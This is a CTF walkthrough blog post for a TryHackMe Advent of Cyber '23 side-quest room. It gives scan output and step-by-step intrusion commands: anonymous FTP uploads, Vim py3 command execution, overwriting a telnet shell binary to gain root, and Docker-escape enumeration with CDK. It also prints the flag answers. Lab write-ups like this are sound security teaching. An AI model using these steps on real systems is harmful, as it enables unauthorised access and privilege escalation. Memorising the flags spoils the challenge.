---
layout: post
author: nIIk
title: "THM Advent of Cyber '23 Side Quest 3 -- Frosteau Busy with Vim"
date: 2023-12-28 00:03
keywords: "THM, TryHackMe, Advent of Cyber, christmas, 2023, Docker, Docker Escape, BusyBox, CDK"
categories: [THM]
tags: [CTF, THM, Docker, VIM, FTP, BusyBox, CDK]
---
## Introduction

"Frosteau Busy with Vim" is a free, **insane** THM challenge, part of the [Advent of Cyber '23 Side Quest](https://tryhackme.com/room/adventofcyber23sidequest) event. This Room is the third of four. During the AoC 23 event, the access to the room had to be gained via a key. The way to obtain the key is covered [here](/posts/thm_aoc_23_sq#third-side-quest-challenge-key). The challenge is based on a box hosting a Docker container with a variety of misconfigured services.

## Port Scans

Starting with a simple port scan, we can see that multiple network services are running on the host.

```shell
[nick@tuf504]─[~] sudo nmap -sS -p- 10.10.244.47
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-12 02:12 GMT
Nmap scan report for 10.10.244.47
Host is up (0.027s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8065/tcp open  unknown
8075/tcp open  unknown
8085/tcp open  unknown
8095/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 11.01 seconds
```

To get greater insights into the running services, I performed a more detailed scan of the detected open ports.

```shell
[nick@tuf504]─[~] sudo nmap -sSCV -A -O -T4 -p 22,80,8065,8075,8085,8095 10.10.244.47
Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-12 02:21 GMT
Nmap scan report for 10.10.244.47
Host is up (0.024s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 11:1c:ff:71:b9:9f:44:d2:e0:ff:78:3e:cc:47:cf:22 (RSA)
|   256 81:75:e3:63:f0:62:e3:20:74:e9:a2:b7:92:44:c7:af (ECDSA)
|_  256 ff:06:82:6c:75:65:a1:f2:4a:74:a9:28:61:8a:5f:22 (ED25519)
80/tcp   open  http    WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Tue, 12 Dec 2023 02:21:06 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Tue, 12 Dec 2023 02:21:06 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
|_http-server-header: WebSockify Python/3.8.10
|_http-title: Error response
8065/tcp open  telnet
| fingerprint-strings: 
|   GenericLines, GetRequest, Help, NCP, NULL, RPCCheck, tn3270: 
|     Ubuntu 22.04.3 LTS
|   SIPOptions: 
|     Ubuntu 22.04.3 LTS
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|_    Accept: application/sdp
8075/tcp open  ftp     BusyBox ftpd (D-Link DCS-932L IP-Cam camera)
| ftp-syst: 
|   STAT: 
| Server status:
|  TYPE: BINARY
|_Ok
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.18.0.2 is not the same as 10.10.244.47
|_ftp-bounce: bounce working!
8085/tcp open  telnet
| fingerprint-strings: 
|   NULL: 
|     Ubuntu 22.04.3 LTS
|     [2;1H
|     [2;1H 
|     [3;1H
|     \x1b[0%m
|     [3;1H 
|     [1;1H
|     [2;1H
|     [34m~ 
|     [3;1H~ 
|     [4;1H~ 
|     [5;1H~ 
|     [6;1H~ 
|     [7;1H~ 
|     [8;1H~ 
|     [9;1H~ 
|_    [10;1H~
8095/tcp open  telnet
| fingerprint-strings: 
|   GenericLines: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|     [?25h
|     [?25l
|     [1;49H
|     [0;7m
|     [29C
|     [?25h
|   NULL: 
|     Ubuntu 22.04.3 LTS
|     [?2004h
|     [1;24r
|     [?7h
|     [?25l
|     [22;24H
|     [0;7m
|     Directory '.' is not writable ]
|     [0;7m
|     nano 6.2 New Buffer 
|     [1;79H
|     [22B
|     [0;7m
|     (B^G
|     Help
|     [0;7m
|     (B^O
|     Write Out 
|     [0;7m
|     (B^W
|     Where Is 
|     [0;7m
|     (B^K
|     [0;7m
|     (B^T
|     Execute 
|     [0;7m
|     (B^C
|     Location
|     [0;7m
|     (B^X
|     Exit
|     [0;7m
|     (B^R
|     Read File 
|     [0;7m
|     (B^\x1b[m
|     Replace 
|     [0;7m
|     (B^U
|     Paste 
|     [0;7m
|     (B^J
|     Justify 
|     [0;7m
|     (B^/
|     Line
|     [22A
|_    [?25h
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.94%I=7%D=12/12%Time=6577C392%P=x86_64-pc-linux-gnu%r(Get
SF:Request,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x2
SF:0WebSockify\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2012\x20Dec\x202023\x2
SF:002:21:06\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/html;
SF:charset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20PUB
SF:LIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20\x
SF:20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20\x
SF:20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>
SF:\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20
SF:response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20405
SF:</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x20A
SF:llowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expla
SF:nation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x20t
SF:his\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptio
SF:ns,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\nS
SF:erver:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Tue,\x2012\x20Dec\x
SF:202023\x2002:21:06\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20t
SF:ext/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20HT
SF:ML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\
SF:x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-eq
SF:uiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x
SF:20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>
SF:Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20cod
SF:e:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsupport
SF:ed\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p
SF:>Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x20S
SF:erver\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\x2
SF:0\x20</body>\n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8065-TCP:V=7.94%I=7%D=12/12%Time=6577C38F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,24,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x2
SF:022\.04\.3\x20LTS\r\n\r")%r(GenericLines,24,"\xff\xfd\x01\xff\xfd\x1f\x
SF:ff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x2022\.04\.3\x20LTS\r\n\r")%r(GetReq
SF:uest,24,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x
SF:2022\.04\.3\x20LTS\r\n\r")%r(RPCCheck,24,"\xff\xfd\x01\xff\xfd\x1f\xff\
SF:xfb\x01\xff\xfb\x03\r\r\nUbuntu\x2022\.04\.3\x20LTS\r\n\r")%r(Help,24,"
SF:\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x2022\.04\
SF:.3\x20LTS\r\n\r")%r(SIPOptions,103,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x0
SF:1\xff\xfb\x03\r\r\nUbuntu\x2022\.04\.3\x20LTS\r\n\rOPTIONS\x20sip:nm\x2
SF:0SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20nm;branch=foo\r\nFrom:\x20<sip:nm@
SF:nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r\nCall-ID:\x2050000\r\nCSeq:\x204
SF:2\x20OPTIONS\r\nMax-Forwards:\x2070\r\nContent-Length:\x200\r\nContact:
SF:\x20<sip:nm@nm>\r\nAccept:\x20application/sdp\r\n\r\n")%r(NCP,24,"\xff\
SF:xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x2022\.04\.3\x2
SF:0LTS\r\n\r")%r(tn3270,24,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\
SF:x03\r\r\nUbuntu\x2022\.04\.3\x20LTS\r\n\r");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8085-TCP:V=7.94%I=7%D=12/12%Time=6577C395%P=x86_64-pc-linux-gnu%r(N
SF:ULL,9E7,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x
SF:2022\.04\.3\x20LTS\r\n\r\x1b\[m\x1b\[m\x1b\[0m\x1b\[H\x1b\[2J\x1b\[2;1H
SF:\xbd\x1b\[6n\x1b\[2;1H\x20\x20\x1b\[3;1H\x1bPzz\x1b\\\x1b\[0%m\x1b\[6n\
SF:x1b\[3;1H\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b\[1;1H\x1b\[2;
SF:1H\x1b\[1m\x1b\[34m~\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b\[3;1H~\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x1b\[4;1H~\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b
SF:\[5;1H~\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b\[6;1H~\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x1b\[7;1H~\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x1b\[8;1H~\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x1b\[9;1H~\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:1b\[10;1H~\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8095-TCP:V=7.94%I=7%D=12/12%Time=6577C395%P=x86_64-pc-linux-gnu%r(N
SF:ULL,250,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03\r\r\nUbuntu\x
SF:2022\.04\.3\x20LTS\r\n\r\x1b\[\?2004h\x1b\)0\x1b\[1;24r\x1b\[m\x1b\(B\x
SF:1b\[4l\x1b\[\?7h\x1b\[\?25l\x1b\[H\x1b\[J\x1b\[22;24H\x1b\[0;7m\x1b\(B\
SF:[\x20Directory\x20'\.'\x20is\x20not\x20writable\x20\]\x1b\[m\x1b\(B\x1b
SF:\[H\x1b\[0;7m\x1b\(B\x20\x20GNU\x20nano\x206\.2\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20New
SF:\x20Buffer\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x1b\[1;79H\x1b\[m\x1b\(B\r\x1b\[22B\x1b\[0;7m\x1b\(B\^G\x1b\[m\x1b\(B\
SF:x20Help\x1b\[6C\x1b\[0;7m\x1b\(B\^O\x1b\[m\x1b\(B\x20Write\x20Out\x20\x
SF:1b\[0;7m\x1b\(B\^W\x1b\[m\x1b\(B\x20Where\x20Is\x20\x20\x1b\[0;7m\x1b\(
SF:B\^K\x1b\[m\x1b\(B\x20Cut\x1b\[7C\x1b\[0;7m\x1b\(B\^T\x1b\[m\x1b\(B\x20
SF:Execute\x20\x20\x20\x1b\[0;7m\x1b\(B\^C\x1b\[m\x1b\(B\x20Location\r\x1b
SF:\[1B\x1b\[0;7m\x1b\(B\^X\x1b\[m\x1b\(B\x20Exit\x1b\[6C\x1b\[0;7m\x1b\(B
SF:\^R\x1b\[m\x1b\(B\x20Read\x20File\x20\x1b\[0;7m\x1b\(B\^\\\x1b\[m\x1b\(
SF:B\x20Replace\x20\x20\x20\x1b\[0;7m\x1b\(B\^U\x1b\[m\x1b\(B\x20Paste\x20
SF:\x20\x20\x20\x20\x1b\[0;7m\x1b\(B\^J\x1b\[m\x1b\(B\x20Justify\x20\x20\x
SF:20\x1b\[0;7m\x1b\(B\^/\x1b\[m\x1b\(B\x20Go\x20To\x20Line\r\x1b\[22A\x1b
SF:\[\?25h")%r(GenericLines,27D,"\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\
SF:xfb\x03\r\r\nUbuntu\x2022\.04\.3\x20LTS\r\n\r\x1b\[\?2004h\x1b\)0\x1b\[
SF:1;24r\x1b\[m\x1b\(B\x1b\[4l\x1b\[\?7h\x1b\[\?25l\x1b\[H\x1b\[J\x1b\[22;
SF:24H\x1b\[0;7m\x1b\(B\[\x20Directory\x20'\.'\x20is\x20not\x20writable\x2
SF:0\]\x1b\[m\x1b\(B\x1b\[H\x1b\[0;7m\x1b\(B\x20\x20GNU\x20nano\x206\.2\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20New\x20Buffer\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x1b\[1;79H\x1b\[m\x1b\(B\r\x1b\[22B\x1b\[0;7m\x1b
SF:\(B\^G\x1b\[m\x1b\(B\x20Help\x1b\[6C\x1b\[0;7m\x1b\(B\^O\x1b\[m\x1b\(B\
SF:x20Write\x20Out\x20\x1b\[0;7m\x1b\(B\^W\x1b\[m\x1b\(B\x20Where\x20Is\x2
SF:0\x20\x1b\[0;7m\x1b\(B\^K\x1b\[m\x1b\(B\x20Cut\x1b\[7C\x1b\[0;7m\x1b\(B
SF:\^T\x1b\[m\x1b\(B\x20Execute\x20\x20\x20\x1b\[0;7m\x1b\(B\^C\x1b\[m\x1b
SF:\(B\x20Location\r\x1b\[1B\x1b\[0;7m\x1b\(B\^X\x1b\[m\x1b\(B\x20Exit\x1b
SF:\[6C\x1b\[0;7m\x1b\(B\^R\x1b\[m\x1b\(B\x20Read\x20File\x20\x1b\[0;7m\x1
SF:b\(B\^\\\x1b\[m\x1b\(B\x20Replace\x20\x20\x20\x1b\[0;7m\x1b\(B\^U\x1b\[
SF:m\x1b\(B\x20Paste\x20\x20\x20\x20\x20\x1b\[0;7m\x1b\(B\^J\x1b\[m\x1b\(B
SF:\x20Justify\x20\x20\x20\x1b\[0;7m\x1b\(B\^/\x1b\[m\x1b\(B\x20Go\x20To\x
SF:20Line\r\x1b\[22A\x1b\[\?25h\x1b\[\?25l\x1b\[1;49H\x1b\[0;7m\x1b\(B\*\x
SF:1b\[29C\x1b\[m\x1b\(B\r\x1b\[3B\x1b\[\?25h");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; Device: webcam; CPE: cpe:/o:linux:linux_kernel, cpe:/h:dlink:dcs-932l

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   24.54 ms 10.8.0.1
2   24.65 ms 10.10.244.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 84.94 seconds
```

Overall, we can access the following services over the network:
- SSH
- HTTP Python Server
- Telnet Shell
- BusyBox FTP
- Vim
- Nano

However, only the following services are used to complete the challenge:
- Telnet Shell
- BusyBox FTP
- Vim

## Initial Access

Starting with the FTP server, the Nmap scan shows that the server allows _Anonymous_ logins.

```shell
[nick@tuf504]─[~] ftp anonymous@10.10.244.47 8075
Connected to 10.10.244.47.
220 Operation successful
230 Operation successful
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 Operation successful
150 Directory listing
total 8132
-rw-r--r--    1 0        0             3010 Nov  5 18:49 FROST-2247-SP.txt
-rw-r--r--    1 0        0             3211 Nov  5 18:50 YETI-1125-SP.txt
-rw-r--r--    1 0        0               24 Nov  5 19:06 flag-1-of-4.txt
-rwxrwxrwx    1 0        0               12 Nov  5 19:07 flag-2-of-4.sh
-rw-r--r--    1 0        0          2127524 Nov  5 18:54 frostling_base.png
-rw-r--r--    1 0        0          2305908 Nov  5 18:54 frostling_five.png
-rw-r--r--    1 0        0          1589463 Nov  5 18:54 yeti_footage.png
-rw-r--r--    1 0        0          2277409 Nov  5 18:54 yeti_mugshot.png
226 Operation successful
ftp> get flag-1-of-4.txt
200 Operation successful
150 Opening BINARY connection for flag-1-of-4.txt (24 bytes)
226 Operation successful
24 bytes received in 0.0679 seconds (354 bytes/s)
```

After a quick look, we can see the first flag and a hint to the second flag.

>What is the value of the first flag?
>- [x] THM{Let.the.game.begin}
{: .prompt-info }

---

```bash
echo $FLAG2
```
{: file='flag-2-of-4.sh'}

As the second flag is stored as an environmental variable, we can use Vim to run the provided bash script:

```shell
[nick@tuf504]─[~] ncat 10.10.244.47 8085
:echo $FLAG2
```

![Flag 2](blog/thm/aoc_23_room3/vim_1.png)

>What is the value of the second flag?
>- [x] THM{Seems.like.we.are.getting.busy}
{: .prompt-info }

---

The next phase consisted of enumerating the environment through Vim via the use of the `py3` inbuild command.

E.G.: `:py3 import os; print(os.listdir("/"))` will list the root directory.

>Read more about Vim exploitation: [https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)

Overall, it looks like the system does not have any binary, including any `sh` or `bash`. Therefore, my team and I came to the conclusion that we could work our way around that by uploading BusyBox via the FTP.

```shell
ftp> put busybox
200 Operation successful
150 Ok to send data
226 Operation successful
1112880 bytes sent in 0.522 seconds (2.04 Mbytes/s)
ftp> ls
200 Operation successful
150 Directory listing
total 9504
-rw-r--r--    1 0        0             3010 Nov  5 18:49 FROST-2247-SP.txt
-rw-r--r--    1 0        0             3211 Nov  5 18:50 YETI-1125-SP.txt
-rw-r--r--    1 0        0          1275832 Dec 12 14:23 busybox
-rw-r--r--    1 0        0               24 Nov  5 19:06 flag-1-of-4.txt
-rw-r--r--    1 0        0               12 Nov  5 19:07 flag-2-of-4.sh
-rw-r--r--    1 0        0          2127524 Nov  5 18:54 frostling_base.png
-rw-r--r--    1 0        0          2305908 Nov  5 18:54 frostling_five.png
-rw-r--r--    1 0        0          1589463 Nov  5 18:54 yeti_footage.png
-rw-r--r--    1 0        0          2277409 Nov  5 18:54 yeti_mugshot.png
```

```vim
:py3 import shutil; shutil.copyfile("/tmp/ftp/busybox", "/tmp/busybox")
:py3 import os; os.chmod("/tmp/busybox", 0o777)
:!/tmp/busybox sh
$
```

Now, when we finally have a shell, we can move on to privilege escalation.

## Privilege Escalation

After a quick look over the running processes with `ps`, we can see that the Telnet session on port **8065** attempts to run `/usr/frosty/sh`.

![PS](blog/thm/aoc_23_room3/ps_1.png)

However, this file does not appear to be valid. That being, if we list the directory, we can see that the permissions are open, and we can (re)write the file with our own `sh` binary.

![SH](blog/thm/aoc_23_room3/sh_1.png)

In order to upload `sh` on the server, we can use the same technique we used for BusyBox.

```shell
ftp> put sh
200 Operation successful
150 Ok to send data
226 Operation successful
125640 bytes sent in 0.0644 seconds (1.86 Mbytes/s)
ftp> ls
200 Operation successful
150 Directory listing
total 9504
-rw-r--r--    1 0        0             3010 Nov  5 18:49 FROST-2247-SP.txt
-rw-r--r--    1 0        0             3211 Nov  5 18:50 YETI-1125-SP.txt
-rw-r--r--    1 0        0          1275832 Dec 12 14:23 busybox
-rw-r--r--    1 0        0               24 Nov  5 19:06 flag-1-of-4.txt
-rw-r--r--    1 0        0               12 Nov  5 19:07 flag-2-of-4.sh
-rw-r--r--    1 0        0          2127524 Nov  5 18:54 frostling_base.png
-rw-r--r--    1 0        0          2305908 Nov  5 18:54 frostling_five.png
-rw-r--r--    1 0        0           125640 Dec 12 14:29 sh
-rw-r--r--    1 0        0          1589463 Nov  5 18:54 yeti_footage.png
-rw-r--r--    1 0        0          2277409 Nov  5 18:54 yeti_mugshot.png
```

Then, use Vim to copy the file and set the privileges.

```vim
:py3 import shutil; shutil.copyfile("/tmp/ftp/sh", "/usr/frosty/sh")
:py3 import os; os.chmod("/usr/frosty/sh", 0o777)
```

And finally, open the telnet shell.

```shell
[nick@tuf504]─[~] ncat 10.10.96.159 8065
��������
Ubuntu 22.04.3 LTS
# cd /tmp
cd /tmp
# ./busybox sh
./busybox sh
/tmp # whoami
whoami
root
/tmp # ls /root
ls /root
flag-3-of-4.txt
/tmp # cat /root/flag-3-of-4.txt
cat /root/flag-3-of-4.txt
THM{Not.all.roots.and.routes.are.equal}
```

>What is the value of the third flag?
>- [x] THM{Not.all.roots.and.routes.are.equal}
{: .prompt-info }

## Docker Escape

As we know that the root directory of the system contains a `.dockerenv` file, we can be sure that the telnet sessions are running in a Docker container. Now that we have root access, we can try to enumerate the container and potentially escape into the host.

As the system does not have any binary, we cannot use container enumeration scripts like [deepce](https://github.com/stealthcopter/deepce), as they will fail to give any useful results.

That being said, [CDK](https://github.com/cdk-team/CDK/tree/main) would be the perfect tool in that case, as it's a pre-build binary.

```shell
/# ./cdk eva --full
./cdk eva --full
...SNIP...
[  Information Gathering - Commands and Capabilities  ]
...SNIP...
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
